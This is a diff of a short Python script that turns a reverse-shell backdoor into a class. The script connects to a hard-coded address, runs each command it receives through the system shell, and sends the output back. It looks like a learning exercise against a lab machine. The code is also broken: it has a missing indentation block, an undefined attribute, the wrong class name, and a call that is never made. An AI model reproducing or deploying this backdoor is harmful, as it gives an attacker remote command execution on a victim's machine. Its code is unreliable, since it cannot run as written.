@@ -1,21 +1,27 @@
 import socket
 import subprocess
 
-def command_execution(command):
-	return subprocess.check_output(command, shell=True)
+class Socket:
+	def __init__(self, ip, port):
+	self.Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	self.Connection.connect((ip,port))
 
 
-Connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-Connection.connect(('10.0.2.15',8080))
+	def command_execution(self, command):
+		return subprocess.check_output(command, shell=True)
 
 #Connection.send('Connection Successful\n')
 
+	def start_socket(self):
+		while True:
 
-while True:
+			command = self.my_connection.recv(1024)
+			command_output = self.command_execution(command)
 
-	command = my_connection.recv(1024)
-	command_output = command_execution(command)
+			self.Connection.send(command_execution)
 
-	Connection.send(command_execution)
+		self.Connection.close()
 
-Connection.close()
+my_socket_object = MySocket('10.0.2.15', 8080)
+my_socket_object.start_socket
+
